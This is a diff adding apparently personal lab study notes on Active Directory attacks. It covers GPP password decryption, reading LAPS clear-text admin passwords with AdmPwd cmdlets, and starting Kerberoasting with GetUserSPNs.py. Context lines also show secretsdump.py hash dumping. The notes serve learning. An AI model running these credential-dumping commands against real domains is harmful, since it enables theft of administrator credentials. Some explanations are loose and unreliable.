@@ -99,3 +99,31 @@ secretsdump.py -sam /tmp/sam-reg -system /tmp/system-reg LOCAL
     #Extract NTLM hashes
     secretsdump.py -just-dc-ntlm <DomainName>/<AD_Admin_User>@MACHINE_IP
     ```
+# 8-LAPS(im not understand it completely):
+- GPP:
+  - **Microsoft implemented a method to change local administrator accounts across workstations using Group Policy Preferences (GPP)**
+  - GPP is a tool that allows administrators to create domain policies with embedded credentials.
+  - Once the GPP is deployed, different XML files are created in the SYSVOL folder.
+  - The issue was the GPP relevant XML files contained a password encrypted using AES-256 bit encryption, but Microsoft somehow published its private key
+  - Since Domain users can read the content of the SYSVOL folder, it becomes easy to decrypt the stored passwords
+- LAPS:
+   - LAPS uses **admpwd.dll** to change the local administrator password and update the value of **ms-mcs-AdmPwd**
+   - **ms-mcs-AdmPwd** attribute **contains** a clear-text **password** of the local administrator
+   ```
+   #check if LAPS is installed or not
+   dir "C:\Program Files\LAPS\CSE"
+   #check the available commands to use for AdmPwd cmdlets 
+   Get-Command *AdmPwd*
+   #find the right OU
+   Find-AdmPwdExtendedRights -Identity *
+   #login to proper user and:
+   Get-AdmPwdPassword -ComputerName <computerName>
+   ```
+# 9-Kerberoasting:
+  - In order for this attack to work, an adversary must have access to SPN (Service Principal Name) accounts such as IIS User, MSSQL, etc. The Kerberoasting attack involves requesting a Ticket Granting Ticket (TGT) and Ticket Granting Service (TGS).
+  ```
+  #look for SPN
+  impacket/examples/GetUserSPNs.py -dc-ip MACHINE_IP <DomainName>/User
+  #we can send a single request to get a TGS ticket for the target user that has SPN
+  
+  ```
